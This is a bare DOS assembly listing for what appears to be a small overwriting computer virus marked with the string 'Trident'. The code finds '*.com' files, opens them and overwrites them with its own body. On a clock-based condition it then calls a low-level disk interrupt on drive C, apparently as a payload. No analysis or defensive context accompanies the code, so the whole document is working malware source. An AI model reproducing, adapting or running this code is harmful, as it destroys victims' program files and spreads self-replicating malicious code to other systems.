Main:
                Mov Ah,4eh
On1:            Lea Dx,FileSpec
                Int 21h
                Jc On2
                Mov Ax,3d02h
                Mov Dx,9eh
                Int 21h
                Mov Bh,40h
                Lea Dx,Main
                Xchg Ax,Bx
                Mov Cl,Ah
                Int 21h
                Mov Ah,3eh
                Int 21h
                Mov Ah,4fh
                Jmp On1
FileSpec        Db '*.com',0
                Db 'Trident'
On2:            Mov Ah,2ch
                Int 21h
                Cmp Dl,10
                Ja Ende
                Mov Al,2
                Xor Dx,Dx
                Int 25h
Ende:           Ret
Length          Equ $-Main
